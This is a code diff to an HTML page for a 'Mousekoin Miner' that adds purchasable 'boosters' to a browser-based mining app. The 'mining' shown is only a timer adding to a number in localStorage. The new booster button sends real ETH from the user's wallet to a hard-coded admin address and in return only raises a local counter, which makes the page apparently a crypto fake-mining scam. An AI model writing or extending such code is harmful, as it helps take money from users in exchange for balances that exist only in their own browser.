@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Persistent Mousekoin Miner</title>
+  <title>Persistent Mousekoin Miner with Boosters</title>
   <!-- Combined Styling: Beautification & App UI -->
   <style>
     /* Base Beautification Styles */
@@ -122,6 +122,8 @@
     <p>Time Remaining: <span id="timeRemaining">10:00</span></p>
     <button id="startMiningBtn">Start Mining</button>
     <button id="withdrawBtn" disabled>Withdraw Mined MSK</button>
+    <button id="purchaseBoosterBtn">Purchase Booster</button>
+    <p>Your Booster Count: <span id="boosterCount">0</span></p>
 
     <!-- User Withdrawal History -->
     <div id="userWithdrawalHistory" style="display:none;">
@@ -159,31 +161,42 @@
   <script>
     // Set admin wallet address (lowercase for comparisons)
     const adminAddress = "0xde45f6a59a96daa0ae7f26bad254aa88241b8d04";
-    // Minimum withdrawal threshold constant
+    // Minimum withdrawal threshold
     const MIN_WITHDRAWAL = 0.000500000138;
+    // Booster purchase parameters
+    const BOOSTER_INCREMENT = 0.000000000900;  // Additional MSK per second per booster
+    const BOOSTER_COST_ETH = 0.00018;           // Cost in ETH per booster
+    const BOOSTER_RECEIVER = adminAddress;      // Where ETH is sent
+
+    // Base mining rate (MSK per second)
+    const BASE_RATE = 0.000000000138;
+
     let userAccount = "";
     let miningInterval;
     let minedAmount = 0;
-    const ratePerSecond = 0.000000000138;
     const miningDuration = 10 * 60; // 10 minutes in seconds
     let sessionFinished = false;
 
-    // Data persistence using localStorage
-    // withdrawals: object with wallet addresses as keys and arrays of withdrawal records as values.
-    // minedProgress: object with wallet addresses as keys to store current session minedAmount.
+    // Data persistence using localStorage:
+    // withdrawals: object mapping wallet addresses to arrays of withdrawal records.
+    // minedProgress: object mapping wallet addresses to current session minedAmount.
+    // boosterCounts: object mapping wallet addresses to number of boosters purchased.
     let withdrawals = JSON.parse(localStorage.getItem('withdrawals')) || {};
     let minedProgress = JSON.parse(localStorage.getItem('minedProgress')) || {};
+    let boosterCounts = JSON.parse(localStorage.getItem('boosterCounts')) || {};
 
     // Save data to localStorage
     function saveData() {
       localStorage.setItem('withdrawals', JSON.stringify(withdrawals));
       localStorage.setItem('minedProgress', JSON.stringify(minedProgress));
+      localStorage.setItem('boosterCounts', JSON.stringify(boosterCounts));
     }
 
-    // Load the current user's mining progress from localStorage
+    // Load the current user's mining progress and booster count from localStorage
     function loadUserData() {
       minedAmount = minedProgress[userAccount] || 0;
       document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
+      document.getElementById('boosterCount').innerText = boosterCounts[userAccount] || 0;
     }
 
     // Connect wallet function: try injected provider first, else fallback to WalletConnect
@@ -235,7 +248,9 @@
       
       miningInterval = setInterval(() => {
         secondsPassed++;
-        minedAmount += ratePerSecond;
+        // Calculate effective rate: base rate plus boosters purchased
+        let effectiveRate = BASE_RATE + ((boosterCounts[userAccount] || 0) * BOOSTER_INCREMENT);
+        minedAmount += effectiveRate;
         document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
         minedProgress[userAccount] = minedAmount; // Persist current mining progress
         
@@ -307,6 +322,35 @@
       saveData();
       updateUserWithdrawalTable();
       updateAdminWithdrawalTable();
+    });
+
+    // Purchase Booster button event.
+    // Executes a transaction sending BOOSTER_COST_ETH ETH from the user's wallet to BOOSTER_RECEIVER.
+    // On success, increments the user's booster count.
+    document.getElementById('purchaseBoosterBtn').addEventListener('click', async function() {
+      if (!window.ethereum) {
+        alert("No Ethereum provider available.");
+        return;
+      }
+      const valueWei = BigInt(BOOSTER_COST_ETH * 1e18).toString(16); // Convert ETH cost to Wei in hex
+      const txParams = {
+        from: userAccount,
+        to: BOOSTER_RECEIVER,
+        value: "0x" + valueWei
+      };
+      try {
+        const txHash = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [txParams]
+        });
+        alert("Booster purchase transaction sent: " + txHash);
+        boosterCounts[userAccount] = (boosterCounts[userAccount] || 0) + 1;
+        document.getElementById('boosterCount').innerText = boosterCounts[userAccount];
+        saveData();
+      } catch (error) {
+        console.error(error);
+        alert("Booster purchase failed: " + error.message);
+      }
     });
 
     // Update the user's withdrawal table
